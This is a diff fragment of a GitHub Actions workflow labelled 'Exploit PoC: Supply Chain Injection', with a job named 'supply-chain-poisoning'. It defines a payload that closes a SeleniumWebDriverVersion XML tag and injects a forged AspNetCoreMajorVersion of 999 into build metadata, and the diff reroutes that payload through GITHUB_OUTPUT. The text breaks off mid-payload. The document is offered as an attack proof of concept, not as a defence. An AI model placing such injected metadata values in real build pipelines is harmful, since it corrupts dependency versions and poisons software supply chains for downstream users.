@@ -1,17 +1,16 @@
 name: "Exploit PoC: Supply Chain Injection"
+
 on:
   workflow_dispatch:
 
 jobs:
   supply-chain-poisoning:
-    name: "Simulate Supply Chain Attack"
     runs-on: ubuntu-latest
     steps:
-      - name: "Clone Repository"
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
       - name: "Inject Malicious Metadata"
         id: metadata
         run: |
-          # Professional Metadata Injection
-          PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
+          echo "payload<<EOF" >> $GITHUB_OUTPUT
+          echo "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
